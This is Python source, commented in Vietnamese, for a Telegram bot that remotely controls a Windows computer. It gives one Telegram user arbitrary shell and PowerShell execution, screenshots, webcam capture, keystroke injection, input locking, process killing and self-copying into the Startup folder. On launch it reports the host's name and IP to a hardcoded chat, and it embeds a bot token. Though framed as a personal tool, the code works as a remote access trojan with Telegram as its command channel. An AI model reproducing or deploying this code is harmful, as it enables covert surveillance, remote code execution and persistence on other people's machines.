import keyboard
import pyperclip
import socket
import win32com.shell.shell as shell
import pyautogui
import win32ui
import comtypes
import tkinter as tk
from tkinter import messagebox
import webbrowser
import psutil
import subprocess
import telebot
from telebot.apihelper import ApiException
import time
import datetime
import win32gui
import win32process
import ctypes
from ctypes import wintypes
from PIL import ImageGrab
import io
import cv2
import os
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import shutil
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import getpass
import threading
import sys
import logging
import win32api
import win32con
import win32com.client
from win10toast import ToastNotifier
from functools import wraps

def init_com():
    try:
        comtypes.CoInitialize()
    except:
        pass 

def bring_to_foreground():
    shell = win32com.client.Dispatch("WScript.Shell")
    shell.SendKeys('%')
    win32gui.SetForegroundWindow(win32gui.GetDesktopWindow())

TOKEN = "7000236443:AAFFH4EWNxunzlk7p5NhHzNTtxgrkCJhQWs"
bot = telebot.TeleBot(TOKEN)
CHAT_ID = 6677602253
ALLOWED_USER_ID = 6677602253  

def restricted(func):
    @wraps(func)
    def wrapped(message, *args, **kwargs):
        user_id = message.from_user.id
        if user_id != ALLOWED_USER_ID:
            bot.reply_to(message, "Bạn không có quyền sử dụng bot này.Liên hệ @tienkjaz để cấp quyền")
            return
        return func(message, *args, **kwargs)
    return wrapped

logging.basicConfig(level=logging.INFO)

toaster = ToastNotifier()

def send_startup_notification():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        message = f"Máy tính đã mở.\nHostname: {hostname}\nĐịa chỉ IP: {ip_address}"
        bot.send_message(6677602253, message)  # Thay CHAT_ID bằng ALLOWED_USER_ID
    except Exception as e:
        print(f"Không thể gửi thông báo khởi động: {str(e)}")

@bot.message_handler(commands=['keyboard'])
@restricted
def simulate_keypress(message):
    try:
        # Lấy các phím cần nhấn từ tin nhắn
        keys = message.text.split(maxsplit=1)[1]
        
        # Tách các phím thành danh sách
        key_list = keys.split('+')
        
        # Mô phỏng nhấn phím
        keyboard.press_and_release('+'.join(key_list))
        
        bot.reply_to(message, f"Đã mô phỏng nhấn phím: {keys}")
    except IndexError:
        bot.reply_to(message, "Vui lòng nhập các phím sau lệnh /keyboard. Ví dụ: /keyboard ctrl+c")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi mô phỏng nhấn phím: {str(e)}")
@bot.message_handler(commands=['clipboard'])
@restricted
def copy_to_clipboard(message):
    try:
       
        content = message.text.split(maxsplit=1)[1]
        
       
        pyperclip.copy(content)
        
        bot.reply_to(message, "Đã sao chép nội dung vào clipboard.")
    except IndexError:
        bot.reply_to(message, "Vui lòng nhập nội dung sau lệnh /clipboard. Ví dụ: /clipboard Xin chào!")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi sao chép vào clipboard: {str(e)}")
@bot.message_handler(commands=['powershell'])
@restricted
def execute_powershell(message):
    try:
        
        command = message.text.split(maxsplit=1)[1]
        
       
        result = subprocess.run(["powershell", "-Command", command], 
                                capture_output=True, text=True, encoding='utf-8')
        
      
        output = result.stdout if result.stdout else result.stderr
        
       
        if len(output) > 4000:
            output = output[:4000] + "...\n(Kết quả đã bị cắt ngắn)"
        
        
        bot.reply_to(message, f"Kết quả:\n```\n{output}\n```")
        logging.info("PowerShell command executed successfully")
    except IndexError:
        bot.reply_to(message, "Vui lòng nhập lệnh sau /powershell. Ví dụ: /powershell Get-Process")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi thực thi lệnh PowerShell: {str(e)}")
        logging.error(f"Error in powershell command: {str(e)}")
@bot.message_handler(commands=['start'])
@restricted
def start(message):
    logging.info(f"Received start command from {message.chat.id}")
    commands_info = "Chào bạn!\n\n" \
                    "Đây là các lệnh mà tôi hỗ trợ:\n\n" \
                    "/status - Xem trạng thái hệ thống (CPU, RAM, Disk)\n" \
                    "/volume [số từ 0 đến 100] - Điều chỉnh âm lượng máy tính\n" \
                    "/shutdown - Tắt máy tính\n" \
                    "/uptime - Xem thời gian hoạt động của hệ thống\n" \
                    "/process - Xem danh sách các ứng dụng đang mở\n" \
                    "/close <số thứ tự> - Đóng ứng dụng theo số thứ tự\n" \
                    "/screenshot - Chụp ảnh màn hình\n" \
                    "/lock - Khóa bàn phím và chuột\n" \
                    "/unlock - Mở khóa bàn phím và chuột\n" \
                    "/keepawake - Giữ màn hình luôn bật\n" \
                    "/disablekeepawake - Tắt chế độ giữ màn hình luôn bật\n" \
                    "/lockstatus - Xem trạng thái lock\n" \
                    "/keyboard - Mô phỏng bàn phím\n" \
                    "/clipboard - ghi vào bảng nhớ tạm\n" \
                    "/forceunlock - mở khóa khẩn cấp\n" \
                    "/hi - chào bot\n" \
                    "/lockscreen - Khóa màn hình\n" \
                    "/shell <lệnh> - Thực thi lệnh shell\n" \
                    "/powershell - sử dụng powershell\n" \
                    "/sleep - Chuyển máy tính vào chế độ ngủ\n" \
                    "/webcam - Chụp ảnh từ webcam\n" \
                    "/openurl - mở url\n" \
                    "/chat - chat nội dung lên màn hình\n" \
                    "/messenger <nội dung> - Gửi thông báo đến máy tính\n" \
                    "/about - Thông tin về bot và người tạo\n" \
                    "/startup - Sao chép bot vào thư mục Startup\n\n" \
                    "Hãy sử dụng /help để xem lại danh sách lệnh này."
    bot.reply_to(message, commands_info)
    logging.info(f"Sent start command response to {message.chat.id}")

def show_messagebox(content):
    def show():
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Tin nhắn mới by Tiến", content)
        root.destroy()
    
    threading.Thread(target=show, daemon=True).start()



is_input_locked = False


@bot.message_handler(commands=['lock'])
@restricted
def lock_input(message):
    global is_input_locked
    try:
        
        ctypes.windll.user32.BlockInput(True)
        
        is_input_locked = True
        bot.reply_to(message, "Đã khóa bàn phím và chuột.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi khóa: {str(e)}")


@bot.message_handler(commands=['unlock'])
@restricted
def unlock_input(message):
    global is_input_locked
    try:
        # Mở khóa input
        for _ in range(5): 
            ctypes.windll.user32.BlockInput(False)
            time.sleep(0.1)  
        
        is_input_locked = False
        bot.reply_to(message, "Đã mở khóa bàn phím và chuột.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi mở khóa: {str(e)}")
    finally:
        
        ctypes.windll.user32.BlockInput(False)


@bot.message_handler(commands=['lockstatus'])
@restricted
def lock_status(message):
    global is_input_locked
    status = "đang khóa" if is_input_locked else "đang mở"
    bot.reply_to(message, f"Trạng thái khóa input: {status}")


@bot.message_handler(commands=['forceunlock'])
@restricted
def force_unlock(message):
    global is_input_locked
    try:
        for _ in range(10):  
            ctypes.windll.user32.BlockInput(False)
            time.sleep(0.1)  
        is_input_locked = False
        bot.reply_to(message, "Đã force unlock tất cả input.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi force unlock: {str(e)}")

@bot.message_handler(commands=['hi'])
@restricted
def hi(message):
    bot.reply_to(message, "hi concak.")


@bot.message_handler(commands=['keepawake'])
@restricted
def keep_awake(message):
    try:
        ctypes.windll.kernel32.SetThreadExecutionState(
            ctypes.c_int(0x80000002)
        )
        bot.reply_to(message, "Đã cài đặt chế độ giữ màn hình luôn bật.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")


@bot.message_handler(commands=['disablekeepawake'])
@restricted
def disable_keep_awake(message):
    try:
        ctypes.windll.kernel32.SetThreadExecutionState(
            ctypes.c_int(0x80000000)
        )
        bot.reply_to(message, "Đã tắt chế độ giữ màn hình luôn bật.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['lockscreen'])
@restricted
def lock_screen(message):
    try:
        ctypes.windll.user32.LockWorkStation()
        bot.reply_to(message, "Đã khóa màn hình.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")


@bot.message_handler(commands=['shell'])
@restricted
def execute_shell(message):
    try:
        command = message.text.split(maxsplit=1)[1]
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        bot.reply_to(message, f"Kết quả:\n{output}")
    except IndexError:
        bot.reply_to(message, "Vui lòng nhập lệnh sau /shell. Ví dụ: /shell ipconfig")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")


@bot.message_handler(commands=['sleep'])
@restricted
def sleep_mode(message):
    try:
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        bot.reply_to(message, "Đã chuyển máy tính vào chế độ ngủ.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
@bot.message_handler(commands=['chat'])
def chat(message):
    try:
        content = message.text.split(maxsplit=1)[1]
        show_messagebox(content)
        bot.reply_to(message, "Đã hiển thị tin nhắn trên máy tính.")
    except IndexError:
        bot.reply_to(message, "Vui lòng nhập nội dung sau lệnh /chat. Ví dụ: /chat Xin chào!")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in chat command: {str(e)}")

@bot.message_handler(commands=['openurl'])
@restricted
def open_url(message):
    try:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
            bot.reply_to(message, "Vui lòng cung cấp URL. Ví dụ: /openurl https://www.google.com")
            return

        url = command_parts[1]
        webbrowser.open(url)
        bot.reply_to(message, f"Đã mở URL: {url} bằng trình duyệt mặc định.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in openurl command: {str(e)}")

@bot.message_handler(commands=['status'])
@restricted
def status(message):
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        ram_percent = psutil.virtual_memory().percent
        disk_percent = psutil.disk_usage('/').percent
        status_message = f"Thông tin hệ thống:\n\nCPU: {cpu_percent}%\nRAM: {ram_percent}%\nDisk: {disk_percent}%"
        bot.reply_to(message, status_message)
        logging.info("Status command executed successfully")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in status command: {str(e)}")

@bot.message_handler(commands=['volume'])
@restricted
def volume(message):
    try:
        init_com()
        new_volume = int(message.text.split()[1])
        if 0 <= new_volume <= 100:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
            is_muted = volume.GetMute()
            if is_muted:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevelScalar(new_volume / 100, None)
            bot.reply_to(message, f"Đã thay đổi âm lượng thành {new_volume}%")
            logging.info(f"Volume set to {new_volume}%")
        else:
            bot.reply_to(message, "Sử dụng /volume [số từ 0 đến 100] để điều chỉnh âm lượng.")
    except (IndexError, ValueError):
        bot.reply_to(message, "Sử dụng /volume [số từ 0 đến 100] để điều chỉnh âm lượng.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in volume command: {str(e)}")

@bot.message_handler(commands=['shutdown'])
@restricted
def shutdown(message):
    try:
        subprocess.run(["shutdown", "/s", "/t", "1"])
        bot.reply_to(message, "Máy tính sẽ tắt ngay lập tức.")
        logging.info("Shutdown command executed successfully")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in shutdown command: {str(e)}")

@bot.message_handler(commands=['uptime'])
@restricted
def uptime(message):
    try:
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        uptime_message = f"Thời gian hoạt động của hệ thống: {datetime.timedelta(seconds=uptime_seconds)}"
        bot.reply_to(message, uptime_message)
        logging.info("Uptime command executed successfully")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in uptime command: {str(e)}")

def get_visible_process_list():
    visible_processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            def callback(hwnd, hwnds):
                if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
                    hwnds.append(hwnd)
                return True
            
            hwnds = []
            win32gui.EnumWindows(callback, hwnds)
            
            for hwnd in hwnds:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if pid == proc.info['pid']:
                    visible_processes.append((proc.info['name'], proc.info['pid']))
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return visible_processes

@bot.message_handler(commands=['process'])
@restricted
def list_processes(message):
    try:
        visible_apps = get_visible_process_list()

        if visible_apps:
            processes_message = "Danh sách các ứng dụng đang mở:\n\n"
            for i, app in enumerate(visible_apps):
                processes_message += f"{i+1}. {app[0]} (PID: {app[1]})\n"
            
            # Chia nhỏ tin nhắn nếu quá dài
            if len(processes_message) > 4000:
                for i in range(0, len(processes_message), 4000):
                    bot.reply_to(message, processes_message[i:i+4000])
            else:
                bot.reply_to(message, processes_message)
            
            bot.reply_to(message, "Để đóng một ứng dụng, sử dụng lệnh /close <số thứ tự>")
            logging.info("Process command executed successfully")
        else:
            bot.reply_to(message, "Không tìm thấy ứng dụng nào đang mở.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in process command: {str(e)}")
@bot.message_handler(commands=['close'])
@restricted
def close_process(message):
    try:
        app_index = int(message.text.split()[1]) - 1
        visible_apps = get_visible_process_list()
        
        if 0 <= app_index < len(visible_apps):
            app_name, pid = visible_apps[app_index]
            try:
                process = psutil.Process(pid)
                process.terminate()  
                process.wait(timeout=10)  
                bot.reply_to(message, f"Đã đóng ứng dụng: {app_name}")
                logging.info(f"Closed application: {app_name}")
            except psutil.NoSuchProcess:
                bot.reply_to(message, f"Không tìm thấy process: {app_name}")
            except psutil.AccessDenied:
                bot.reply_to(message, f"Không có quyền đóng ứng dụng: {app_name}")
            except psutil.TimeoutExpired:
                process.kill() 
                bot.reply_to(message, f"Đã buộc đóng ứng dụng: {app_name}")
        else:
            bot.reply_to(message, "Số thứ tự không hợp lệ.")
    except ValueError:
        bot.reply_to(message, "Vui lòng nhập số thứ tự hợp lệ. Ví dụ: /close 1")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in close command: {str(e)}")

@bot.message_handler(commands=['screenshot'])
@restricted
def screenshot(message):
    try:
        # Chụp màn hình
        img = ImageGrab.grab()
        
        # Chuyển đổi ảnh sang bytes
        bio = io.BytesIO()
        img.save(bio, format='PNG')
        bio.seek(0)
        
        # Gửi ảnh
        bot.send_photo(message.chat.id, photo=bio)
        
        logging.info("Screenshot command executed successfully")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in screenshot command: {str(e)}")
@bot.message_handler(commands=['webcam'])
@restricted
def webcam(message):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.png", frame)
            with open("webcam.png", "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove("webcam.png")
            logging.info("Webcam command executed successfully")
        else:
            bot.reply_to(message, "Không thể chụp ảnh từ webcam.")
        cap.release()
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in webcam command: {str(e)}")

@bot.message_handler(commands=['about'])
@restricted
def about(message):
    about_message = "Đây là bot Telegram để điều khiển hệ thống máy tính.\n\n" \
                    "Tác giả: Xuân Tiến\n" \
                    "Email: tiendathmfa@gmail.com\n" \
                    "Github: github.com/tienkj\n\n" \
                    "Bot được phát triển với Python và sử dụng nhiều thư viện khác nhau."
    bot.reply_to(message, about_message)

@bot.message_handler(commands=['startup'])
@restricted
def copy_to_startup(message):
    try:
        username = getpass.getuser()
        source_file = sys.argv[0]
        destination_folder = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        destination_file = os.path.join(destination_folder, os.path.basename(source_file))
        shutil.copy(source_file, destination_file)
        bot.reply_to(message, f"Đã sao chép tệp vào thư mục Startup.\nĐường dẫn: {destination_file}")
        logging.info("Startup command executed successfully")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in startup command: {str(e)}")

@bot.message_handler(commands=['messenger'])
@restricted
def send_notification(message):
    try:
        content = message.text.split(maxsplit=1)[1]
        toaster.show_toast("Thông báo từ Telegram Bot", 
                           content, 
                           icon_path=None, 
                           duration=5, 
                           threaded=True)
        bot.reply_to(message, "Đã gửi thông báo thành công.")
        logging.info("Notification sent successfully")
    except IndexError:
        bot.reply_to(message, "Vui lòng nhập nội dung sau lệnh /messenger. Ví dụ: /messenger Xin chào!")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
        logging.error(f"Error in messenger command: {str(e)}")

def bot_polling():
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except ApiException as e:
            print(f"ApiException: {e}")
            time.sleep(10)
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    init_com()
    bring_to_foreground()
    
    
    threading.Thread(target=send_startup_notification).start()
    
    bot_polling()
